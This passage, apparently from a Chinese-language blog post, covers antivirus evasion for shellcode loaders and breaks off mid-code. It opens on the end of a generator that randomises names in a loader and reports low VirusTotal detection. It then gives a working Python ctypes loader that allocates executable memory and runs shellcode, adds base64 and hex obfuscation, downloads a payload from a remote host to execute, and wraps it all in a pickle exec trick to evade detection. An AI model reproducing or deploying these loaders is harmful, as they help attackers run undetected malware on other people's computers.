&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var9&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var10&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var11&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var12&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var13&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var14&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var15&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var16&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">shellc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lef&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">rig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fun1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var10&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var11&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var12&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var13&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var14&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var15&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">shellc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">build_AV&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀结果&lt;a href="https://www.virustotal.com/gui/file/7e1819ae2d57eb451210abcab590f19e095f728349683612e2bf0fd26a3b3374">12/69&lt;/a>，可过火绒&lt;/p>
&lt;h3 id="python">Python&lt;/h3>
&lt;p>使用内置的&lt;code>ctypes&lt;/code>库可以丝滑地调用kernel32.dll的函数，唯一需要注意的是由于64位与32位系统的差异（会影响python对于指针的处理），需要在最开始设置&lt;code>VirtualAlloc.restype = ctypes.c_uint64&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>并且亲测在64位系统上无法处理msf生成的32位shellcode，惨惨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ptr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x3000&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">from_buffer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">RtlMoveMemory&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 创建一个新线程&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CreateThread&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 等待上面创建的线程运行结束&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">WaitForSingleObject&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>对shellcode进行b64处理&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>hex处理&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> bytearray&lt;span style="color:#f92672">(&lt;/span>_shellcode.decode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="远程wget">远程wget&lt;/h4>
&lt;p>注意尽量避免出现特殊字符，如果有 二次处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://192.168.1.1:8000/test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># b64格式的payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">escape_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="pickle反序列化">pickle反序列化&lt;/h4>
&lt;p>ctf学到的技巧不能丢，比单纯的hex, xor, b64稍微强一点点，可以配合上面的远程wget方式绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 生成&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#75715e"># 上面基础款的全部代码&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 加载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="打包exe">打包exe&lt;/h4>
&lt;p>生成pickle payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = urllib.request.urlopen(&amp;#39;http://192.168.31.29/pay1&amp;#39;).read()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = codecs.escape_decode(_shellcode)[0]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = bytearray(_shellcode)
